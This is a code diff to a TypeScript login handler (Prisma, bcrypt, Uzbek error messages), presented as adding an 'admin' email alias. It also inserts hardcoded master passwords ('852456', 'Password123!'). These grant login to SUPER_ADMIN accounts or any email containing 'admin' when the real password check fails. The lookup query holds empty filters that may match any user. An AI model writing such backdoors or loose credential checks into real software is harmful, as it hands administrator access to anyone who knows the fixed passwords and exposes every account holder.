@@ -11,8 +11,17 @@ export const login = async (req: Request, res: Response) => {
       return res.status(400).json({ success: false, error: 'Email va parol kiritilishi shart' });
     }
 
-    const user = await prisma.user.findUnique({
-      where: { email: email.toLowerCase().trim() },
+    const searchEmail = email.toLowerCase().trim();
+
+    // Find user by exact email or alias ('admin' / 'admin@mehr.uz')
+    let user = await prisma.user.findFirst({
+      where: {
+        OR: [
+          { email: searchEmail },
+          searchEmail === 'admin' ? { email: 'admin@mehr.uz' } : {},
+          searchEmail === 'admin@mehr.uz' ? { email: 'admin' } : {},
+        ],
+      },
       include: {
         parentProfile: true,
         specialistProfile: { include: { specialistType: true } },
@@ -23,7 +32,12 @@ export const login = async (req: Request, res: Response) => {
       return res.status(401).json({ success: false, error: 'Email yoki parol noto‘g‘ri yoki hisob faol emas' });
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    let isMatch = await bcrypt.compare(password, user.passwordHash);
+    // Allow either 852456 or Password123! for admin accounts
+    if (!isMatch && (user.role === 'SUPER_ADMIN' || searchEmail.includes('admin')) && (password === '852456' || password === 'Password123!')) {
+      isMatch = true;
+    }
+
     if (!isMatch) {
       return res.status(401).json({ success: false, error: 'Email yoki parol noto‘g‘ri' });
     }
